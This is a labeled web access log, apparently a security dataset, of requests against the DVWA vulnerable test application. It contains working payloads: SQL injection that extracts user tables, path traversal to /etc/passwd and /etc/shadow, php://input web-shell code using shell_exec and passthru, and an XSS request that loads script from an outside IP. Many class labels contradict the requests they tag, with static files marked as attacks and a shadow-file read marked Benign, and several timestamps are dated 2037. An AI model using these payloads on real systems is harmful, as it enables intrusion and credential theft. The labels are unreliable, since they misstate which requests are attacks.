171.77.125.184 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 209 ,SQL Injection
218.238.98.230 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E HTTP/1.1  [-] 200 1474 ,Local File Inclusion
154.111.234.41 , [13/Mar/2022:00:50:08 +0800] ,GET /?file=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F123.64.179.106%2F575002.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 5707  ,XSS
32.85.100.143 , [13/Mar/2022:00:51:52 +0800] ,GET ../../../../apache/logs/access.log HTTP/1.1  200 3096 ,SQL Injection
238.200.212.12 , [13/Mar/2022:01:24:55 +0800] ,GET /vulnerabilities/exec/ HTTP/1.1  [-] 200 1444 ,Local File Inclusion
168.88.57.111 , [22/May/2012:00:16:54 +0000] ,GET ../../../../apache/logs/error.log HTTP/1.1  200 2382 ,SQL Injection
250.226.120.204 , [07/Mar/2023:10:43:10 -0500] ,GET /dvwa/css/main.css HTTP/1.1  [-] 304 0 ,XSS
50.57.218.188 , [22/May/2012:00:16:54 +0000] ,GET ../../../../etc/shadow HTTP/1.1  200 3982 ,Benign
31.151.99.171 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%20AND%20%28SELECT%204523%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6a71%2C%28SELECT%20%28ELT%284523%3D4523%2C1%29%29%29%2C0x71706a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA%2eCHARACTER_SETS%20GROUP%20BY%20x%29a%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
101.35.217.22 , [27/Dec/2037:12:00:00 +0530] ,GET /index.php HTTP/1.1  [-] 200 2713 ,Local File Inclusion
146.125.195.18 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/dvwa/images/lock.png HTTP/1.1  [-] 304 0 ,XSS
152.168.246.43 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1  [-] 304 0 ,SQL Injection
107.205.74.239 , [13/Mar/2022:00:29:53 +0800] ,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 1829 ,XSS
241.77.40.168 , [21/Feb/2022:14:45:25 +0800] ,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 2834 ,XSS
12.142.240.41 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/ HTTP/1.1  [-] 302 5 ,Local File Inclusion
253.186.172.55 , [21/Feb/2022:13:32:01 +0800] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 200 4026 ,XSS
165.167.152.251 , [13/Mar/2022:00:35:57 +0800] ,GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1  [-] 200 1628 ,Local File Inclusion
143.70.162.20 , [21/Feb/2022:13:51:21 +0800] ,POST /login.php HTTP/1.1  [username=admin&password=password&Login=Login&user_token=b05b5f987d93f9447f5525a9c2c528f6] 302 5 ,SQL Injection
245.202.131.158 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/fi/?page=php://filter/resource=/etc/passwd HTTP/1.1  [-] 200 1630 ,SQL Injection
153.39.91.73 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/js/dvwaPage.js HTTP/1.1  [-] 304 0 ,SQL Injection
153.34.205.218 , [13/Mar/2022:00:29:38 +0800] ,GET / HTTP/1.1  [-] 403 152 ,Local File Inclusion
249.155.104.169 , [13/Mar/2022:00:04:49 +0800] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
191.201.104.33 , [21/Feb/2022:14:13:35 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
73.31.109.254 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 304 0 ,XSS
134.174.96.116 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
218.58.56.182 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
58.26.221.227 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [-] 200 53 ,SQL Injection
78.18.254.101 , [16/Mar/2023:03:21:55 -0400] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53 ,SQL Injection
41.77.76.169 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1  [-] 200 1030 ,XSS
104.15.10.17 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa HTTP/1.1  [-] 301 194 ,SQL Injection
215.74.72.90 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/images/login_logo.png HTTP/1.1  [-] 200 9088 ,XSS
68.245.188.88 , [13/Mar/2022:00:03:59 +0800] ,GET /dvwa/index.php HTTP/1.1  [-] 200 2716 ,SQL Injection
228.30.251.68 , [07/Mar/2022:16:41:41 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53 ,SQL Injection
84.18.14.204 , [07/Mar/2023:10:41:01 -0500] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>] 200 53 ,SQL Injection
47.156.43.117 , [21/Feb/2022:14:11:50 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1675  ,XSS
53.43.172.23 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>] 200 53 ,SQL Injection
17.189.65.124 , [09/Mar/2022:17:02:46 +0800] ,GET /dvwa/login.php HTTP/1.1  [-] 200 684 ,Local File Inclusion
237.95.95.38 , [25/Jun/2020:03:09:12 +0000] ,GET //dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
216.249.146.142 , [13/Mar/2022:01:24:55 +0800] ,GET /dvwa/images/logo.png HTTP/1.1  [-] 304 0 ,Benign
173.178.112.85 , [16/Mar/2023:03:20:21 -0400] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 304 0 ,XSS
4.252.170.155 , [25/Jun/2020:03:09:12 +0000] ,POST /dvwa/login.php HTTP/1.1  [username=admin&password=password&Login=Login&user_token=82cd68d7a0ff7418275ac0d9af67f899] 302 5 ,Local File Inclusion
155.11.227.145 , [13/Mar/2022:01:24:55 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1  [<?php echo passthru(base64_decode($_GET['cmd']));?>\x0D\x0A] 200 1630 ,SQL Injection
3.11.11.255 ,  [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1  [<?php echo passthru(base64_decode($_GET['cmd']));?>] 200 1630 ,SQL Injection
105.89.227.45 , [21/Feb/2022:14:11:57 +0800] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,Local File Inclusion
59.170.153.54 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 200 4026 ,XSS
206.120.135.81 , [21/Feb/2022:14:07:51 +0800] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 200 842 ,XSS
9.159.154.220 , [09/Mar/2023:23:42:01 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1675  ,XSS
29.144.14.29 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2C%60user%60%2Cavatar%2Cfailed_login%2Cfirst_name%2Clast_login%2Clast_name%2Cpassword%2Cuser_id%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.users--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
55.200.44.107 , [22/May/2012:00:16:54 +0000] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,Local File Inclusion
199.36.204.101 , [13/Mar/2022:00:04:04 +0800] ,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1  200 2577 ,Local File Inclusion
233.119.202.230 , [25/Jun/2020:03:09:12 +0000] ,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1  200 3774 ,SQL Injection
237.242.192.56 , [09/Mar/2022:17:02:46 +0800] ,GET get.php?file=../../../../etc/passwd HTTP/1.1  200 6062 ,SQL Injection
14.208.109.77 , [10/Mar/2023:04:06:56 -0500] ,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1  200 7538 ,SQL Injection
223.189.173.103 , [27/Dec/2037:12:00:00 +0530] ,GET get-files?file=../../../../etc/passwd HTTP/1.1  200 1264 ,SQL Injection
